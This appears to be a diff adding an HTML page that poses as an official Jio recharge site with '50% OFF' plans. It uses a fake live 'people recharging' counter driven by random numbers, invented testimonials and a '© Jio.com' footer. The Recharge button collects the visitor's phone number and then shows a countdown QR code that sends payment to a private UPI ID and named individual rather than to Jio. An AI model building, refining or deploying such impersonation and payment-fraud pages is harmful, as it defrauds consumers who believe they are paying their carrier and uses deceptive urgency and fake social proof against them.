@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jio Recharge Plans – Jio Bio Site</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* Blue Jio-like theme */
+    body {font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; background-color: #e9f2fc; color: #222;}
+    header {background-color: #0a5cd8; color: white; padding: 1rem; text-align: center;}
+    .offer-banner.animated {
+      animation: pulse 1.5s infinite;
+    }
+    .offer-banner {background: #cfe3fc; color: #0a5cd8; font-weight: bold; text-align: center; padding: 0.7em; font-size: 1.1em; letter-spacing: 1px;}
+    @keyframes pulse {
+      0% {background: #cfe3fc;}
+      50% {background: #b8d7f7;}
+      100% {background: #cfe3fc;}
+    }
+    main {padding: 2rem; max-width: 1100px; margin: auto;}
+    h2 {color: #0a5cd8; margin-bottom: 1.2em;}
+    .plans-grid {display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 1rem;}
+    .plan-card {background: #fff; border: 1px solid #b3d2f8; border-radius: 12px; box-shadow: 0 2px 6px rgba(10,92,216,0.07); display: flex; flex-direction: column; align-items: center; padding: 0.7em;}
+    .plan-card:hover {box-shadow: 0 4px 20px rgba(10,92,216,0.18); transform: translateY(-2px) scale(1.03);}
+    .plan-icon {font-size: 1.6em; color: #0a5cd8; margin-bottom: 0.5em;}
+    .plan-price {font-size: 1.1em; font-weight: bold; color: #222; margin-bottom: 0.2em;}
+    .plan-old-price {font-size: 0.95em; color: #888; text-decoration: line-through; margin-left: 0.5em; font-weight: normal;}
+    .plan-validity {font-size: 0.9em; color: #666; margin-bottom: 0.2em;}
+    .plan-desc {font-size: 0.93em; text-align: center; margin-bottom: 0.4em; min-height: 36px;}
+    .plan-btn {background: #0a5cd8; color: #fff; border: none; border-radius: 8px; padding: 0.3em 0.5em; font-size: 0.95em; cursor: pointer; margin-top: auto; text-decoration: none; transition: background 0.2s;}
+    .plan-btn:hover {background: #144aa8;}
+    .badge {background: #cfe3fc; color: #0a5cd8; font-weight: bold; padding: 0.2em 0.6em; border-radius: 6px; font-size: 0.85em; position: absolute; top: 8px; right: 12px; z-index: 2;}
+    /* Modal styles */
+    .modal-bg {display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(10,92,216,0.15); z-index: 9999; justify-content: center; align-items: center;}
+    .modal-bg.active {display: flex;}
+    .modal {background: #fff; padding: 2em 1.3em 1.1em 1.3em; border-radius: 18px; box-shadow: 0 4px 30px rgba(10,92,216,0.17); max-width: 330px; width: 95vw; text-align: center; position: relative; animation: fadeIn 0.27s;}
+    @keyframes fadeIn {from { opacity: 0; transform: scale(0.95);} to { opacity: 1; transform: scale(1);}}
+    .modal-step {display: none;}
+    .modal-step.active {display: block;}
+    .qr-img {width: 210px; border-radius: 10px; margin: 0.6em auto 0.7em auto; box-shadow: 0 2px 12px rgba(10,92,216,0.09); display: block;}
+    .modal-title {font-size: 1.2em; color: #0a5cd8; font-weight: bold; margin-bottom: 0.5em;}
+    .modal-countdown {font-size: 1.1em; color: #0a5cd8; font-weight: bold; margin-bottom: 0.5em;}
+    .modal-warning {font-size: 1em; color: #c00; font-weight: bold; margin-bottom: 0.7em;}
+    .modal-name {font-size: 1em; margin-bottom: 0.5em; color: #222; font-weight: 500;}
+    .close-modal {position: absolute; top: 15px; right: 15px; background: #e3f1ff; color: #0a5cd8; border: none; border-radius: 50%; font-size: 1.1em; width: 2em; height: 2em; cursor: pointer; line-height: 2em;}
+    .close-modal:hover {background: #cfe3fc;}
+    .next-step-btn, .number-submit-btn {background: #0a5cd8; color: #fff; border: none; border-radius: 8px; padding: 0.5em 1.3em; font-size: 1em; cursor: pointer; margin-top: 1em; text-decoration: none; transition: background 0.2s;}
+    .next-step-btn:hover, .number-submit-btn:hover {background: #144aa8;}
+    .number-input {padding: 0.5em; font-size: 1em; border: 1px solid #b3d2f8; border-radius: 6px; margin-bottom: 0.7em; width: 85%;}
+    .input-error {color: #c00; margin-top: 0.3em; font-size: 0.93em; min-height: 1.2em;}
+    /* Engaging elements */
+    .like-area {text-align:center;margin-bottom:1.2em;}
+    .like-btn {background:#cfe3fc;color:#0a5cd8;font-size:1.1em;border:none;border-radius:8px;padding:0.5em 1.2em;cursor:pointer;}
+    .like-btn.liked {background:#b8d7f7;}
+    #testimonial {text-align:center;padding:1em 0;max-width:340px;margin:1.5em auto;background:#e3f1ff;border-radius:9px;box-shadow:0 1px 8px #b8d7f7;}
+    #testimonialText {color:#0a5cd8;font-size:1.07em;}
+    #testimonialUser {color:#222;margin-top:0.5em;}
+    .trending {text-align:center;color:#0a5cd8;font-weight:bold;margin-bottom:1em;}
+    .trust-section {background:#e3f1ff;border-radius:10px;padding:1.5em;margin:2em auto;max-width:600px;box-shadow:0 1px 8px #b8d7f7;}
+    .trust-section h3 {color:#0a5cd8;}
+    .trust-section ul {color:#222;font-size:1em;line-height:1.7;}
+    .trust-section a {color:#0a5cd8;}
+    .trust-section p {font-size:0.95em;color:#555;}
+    @media (max-width: 900px) {.plans-grid {grid-template-columns: repeat(2, 1fr);} main {padding: 1rem;}}
+    @media (max-width: 600px) {.plans-grid {grid-template-columns: 1fr;} .plan-btn {width: 100%;} .modal {max-width: 98vw;}}
+    footer {background: #e3f1ff; text-align: center; padding: 1rem; margin-top: 2rem; font-size: 0.9em; color: #0a5cd8;}
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Jio Recharge Plans Overview</h1>
+    <p></p>
+  </header>
+  <div class="offer-banner animated">
+    ⚡ 50% OFF on all recharge plans! Limited time only. Prices shown are already discounted. ⚡
+  </div>
+  <!-- Engaging Elements -->
+  <div class="trending">
+    <span id="trendingCount">54</span> people are recharging right now!
+  </div>
+  <div class="like-area">
+    <button id="likeBtn" class="like-btn">
+      ❤️ Like <span id="likeCount">0</span>
+    </button>
+  </div>
+  <div id="testimonial">
+    <span id="testimonialText">"Recharge is instant, and the offers are amazing!"</span>
+    <div>– <span id="testimonialUser">Amit (Delhi)</span></div>
+  </div>
+  <main>
+    <section>
+      <h2>Popular Recharge Plans (Aug 2025)</h2>
+      <div class="plans-grid">
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-bolt" aria-label="5G Icon" title="True 5G"></i></span>
+          <div class="plan-price">₹175 <span class="plan-old-price">₹349</span></div>
+          <div class="plan-validity">28 days</div>
+          <div class="plan-desc">2 GB/day, True 5G access.<br>JioCinema, JioTV, JioCloud.</div>
+          <span class="badge">Best Value</span>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-tv" aria-label="OTT Icon" title="OTT Apps"></i></span>
+          <div class="plan-price">₹150 / ₹125 <span class="plan-old-price">₹299 / ₹249</span></div>
+          <div class="plan-validity">28 days</div>
+          <div class="plan-desc">1.5 GB or 1 GB/day.<br>OTT apps included.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-phone" aria-label="Phone Icon" title="Calling"></i></span>
+          <div class="plan-price">₹95 <span class="plan-old-price">₹189</span></div>
+          <div class="plan-validity">28 days</div>
+          <div class="plan-desc">2 GB total.<br>Unlimited calls.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-clock" aria-label="Short term Icon" title="Short Term"></i></span>
+          <div class="plan-price">₹99 <span class="plan-old-price">₹198</span></div>
+          <div class="plan-validity">14 days</div>
+          <div class="plan-desc">2 GB/day.<br>Short validity.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-calendar-alt" aria-label="Calendar Icon" title="Long Term"></i></span>
+          <div class="plan-price">₹375 <span class="plan-old-price">₹749</span></div>
+          <div class="plan-validity">72 days</div>
+          <div class="plan-desc">2 GB/day + 20 GB bonus.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-film" aria-label="OTT Bundle Icon" title="OTT Bundle"></i></span>
+          <div class="plan-price">₹450 <span class="plan-old-price">₹899</span></div>
+          <div class="plan-validity">90 days</div>
+          <div class="plan-desc">2 GB/day + OTT bundle.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-infinity" aria-label="Streaming Icon" title="Streaming"></i></span>
+          <div class="plan-price">₹1013 <span class="plan-old-price">₹2,025</span></div>
+          <div class="plan-validity">200 days</div>
+          <div class="plan-desc">2.5 GB/day + streaming apps.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-star" aria-label="Yearly Pack Icon" title="Yearly Pack"></i></span>
+          <div class="plan-price">₹2,000 <span class="plan-old-price">₹3,999</span></div>
+          <div class="plan-validity">365 days</div>
+          <div class="plan-desc">Yearly pack + OTT bundle.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-fire" aria-label="Starter Icon" title="Starter Pack"></i></span>
+          <div class="plan-price">₹175 <span class="plan-old-price">₹349</span></div>
+          <div class="plan-validity">Starter Pack</div>
+          <div class="plan-desc">Unlimited 5G + JioHotstar.<br>₹2,600 perks.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-gamepad" aria-label="Gaming Icon" title="Gaming Pack"></i></span>
+          <div class="plan-price">₹248 / ₹273 <span class="plan-old-price">₹495 / ₹545</span></div>
+          <div class="plan-validity">Gaming Packs</div>
+          <div class="plan-desc">BGMI bonuses + JioGames Cloud.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-users" aria-label="Family Icon" title="Family Pack"></i></span>
+          <div class="plan-price">₹225 <span class="plan-old-price">₹449</span></div>
+          <div class="plan-validity">Family Pack</div>
+          <div class="plan-desc">Shared data + OTT for family.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+        <div class="plan-card">
+          <span class="plan-icon"><i class="fas fa-cloud" aria-label="Cloud Icon" title="Cloud Gaming"></i></span>
+          <div class="plan-price">₹50 <span class="plan-old-price">₹99</span></div>
+          <div class="plan-validity">Special Pack</div>
+          <div class="plan-desc">500 GB data + Cloud Gaming access.</div>
+          <button class="plan-btn" onclick="openModal()">Recharge</button>
+        </div>
+      </div>
+    </section>
+    <!-- Trust Section (updated) -->
+    <div class="trust-section">
+      <h3>Why Trust Us?</h3>
+      <ul>
+        <li>All plan info is fetched from <a href="https://www.jio.com" target="_blank">Jio.com</a> for accuracy.</li>
+        <li>For any queries, reach us at <a href="https://github.com/YuvrajSinghDheer" target="_blank">GitHub</a> or DM on Instagram!</li>
+      </ul>
+      <p>Payments are secure via UPI. <b>Always verify UPI name before payment.</b></p>
+      <p style="font-size:0.95em;color:#555;">For official details, always check <a href="https://www.jio.com" target="_blank">Jio.com</a>.</p>
+    </div>
+  </main>
+  <!-- Modal Window -->
+  <div class="modal-bg" id="qrModal">
+    <div class="modal">
+      <button class="close-modal" onclick="closeModal()">&times;</button>
+      <!-- Step 0: Enter Mobile Number -->
+      <div class="modal-step" id="modalStep0">
+        <div class="modal-title">Enter Your Jio Number</div>
+        <input type="tel" class="number-input" id="jioNumber" maxlength="10" placeholder="Enter 10-digit number" pattern="[0-9]{10}" />
+        <div class="input-error" id="numberError"></div>
+        <button class="number-submit-btn" onclick="verifyNumber()">Verify & Continue</button>
+      </div>
+      <!-- Step 1: Payment Secure Screen -->
+      <div class="modal-step" id="modalStep1">
+        <div class="modal-title">Payment Secure Screen</div>
+        <div style="font-size:1em;color:#0a5cd8;margin-bottom:1em;">
+          You are proceeding to payment.<br>
+          Please pay only on live QR code. <br>
+          <b>Do not pay on old QR.</b>
+        </div>
+        <button class="next-step-btn" onclick="showStep2()">Proceed to Payment</button>
+      </div>
+      <!-- Step 2: QR Screen with Countdown -->
+      <div class="modal-step" id="modalStep2">
+        <div class="modal-title">Pay Now (Live QR)</dDIiv>
+        <div class="modal-countdown" id="countdown">05:00</div>
+        <div class="modal-warning">#Don't pay on old QR, pay on LIVE!<br>Here is my QR:</div>
+        <img src="qr.png" alt="Live QR Code" class="qr-img">
+        <div class="modal-name">UPI: <b>naveenxff@fam</b><br>Name: <b>NAVEEN DHEER</b></div>
+        <div style="font-size:0.95em;color:#555;margin-top:0.5em">Window expires in 5 minutes</div>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <small>© Jio.com | All recharge info and plans are referenced from official Jio sources.</small>
+  </footer>
+  <script>
+    // Trending counter
+    setInterval(() => {
+      let el = document.getElementById('trendingCount');
+      el.textContent = Math.floor(50 + Math.random()*10);
+    }, 3500);
+
+    // Like button animation
+    let likeCount = 0;
+    let likeBtn = document.getElementById('likeBtn');
+    likeBtn.onclick = function() {
+      likeCount++;
+      document.getElementById('likeCount').textContent = likeCount;
+      likeBtn.classList.add("liked");
+      likeBtn.innerHTML = "💖 Liked! <span id='likeCount'>" + likeCount + "</span>";
+      setTimeout(() => {
+        likeBtn.innerHTML = "❤️ Like <span id='likeCount'>" + likeCount + "</span>";
+        likeBtn.classList.remove("liked");
+      }, 900);
+    };
+
+    // Testimonials carousel
+    const testimonials = [
+      ['"Recharge is instant, and the offers are amazing!"', 'Amit (Delhi)'],
+      ['"Got my plan at 50% OFF, super happy!"', 'Riya (Mumbai)'],
+      ['"Love the Spin & Win game, won 1GB data!"', 'Arjun (Bangalore)'],
+      ['"The payment process is super easy and secure."', 'Priya (Chennai)'],
+    ];
+    let currTest=0;
+    setInterval(()=>{
+      currTest=(currTest+1)%testimonials.length;
+      document.getElementById('testimonialText').textContent = testimonials[currTest][0];
+      document.getElementById('testimonialUser').textContent = testimonials[currTest][1];
+    }, 3200);
+
+    // Modal payment logic
+    let countdownInterval;
+
+    // Modified modal logic for number verification
+    function openModal() {
+      document.getElementById('qrModal').classList.add('active');
+      showStep0();
+    }
+    function closeModal() {
+      document.getElementById('qrModal').classList.remove('active');
+      clearInterval(countdownInterval);
+      document.getElementById('countdown').textContent = "05:00";
+      document.getElementById('jioNumber').value = "";
+      document.getElementById('numberError').textContent = "";
+      hideAllModalSteps();
+    }
+    function hideAllModalSteps() {
+      document.getElementById('modalStep0').classList.remove('active');
+      document.getElementById('modalStep1').classList.remove('active');
+      document.getElementById('modalStep2').classList.remove('active');
+    }
+    function showStep0() {
+      hideAllModalSteps();
+      document.getElementById('modalStep0').classList.add('active');
+      clearInterval(countdownInterval);
+      document.getElementById('countdown').textContent = "05:00";
+    }
+    function verifyNumber() {
+      var number = document.getElementById('jioNumber').value.trim();
+      var errorBox = document.getElementById('numberError');
+      // Allow only 10 digits, numeric, not starting with 0, simple check for Indian numbers
+      if (!/^[6-9]\d{9}$/.test(number)) {
+        errorBox.textContent = "Please enter a valid 10-digit Jio number.";
+        return false;
+      }
+      errorBox.textContent = "";
+      showStep1();
+      return true;
+    }
+    function showStep1() {
+      hideAllModalSteps();
+      document.getElementById('modalStep1').classList.add('active');
+      clearInterval(countdownInterval);
+      document.getElementById('countdown').textContent = "05:00";
+    }
+    function showStep2() {
+      hideAllModalSteps();
+      document.getElementById('modalStep2').classList.add('active');
+      startCountdown(5 * 60); // 5 minutes
+    }
+    function startCountdown(seconds) {
+      let remaining = seconds;
+      function updateDisplay() {
+        let min = Math.floor(remaining / 60);
+        let sec = remaining % 60;
+        document.getElementById('countdown').textContent =
+          (min < 10 ? '0' : '') + min + ":" + (sec < 10 ? '0' : '') + sec;
+      }
+      updateDisplay();
+      clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        remaining--;
+        updateDisplay();
+        if (remaining <= 0) {
+          clearInterval(countdownInterval);
+          document.getElementById('countdown').textContent = "EXPIRED";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
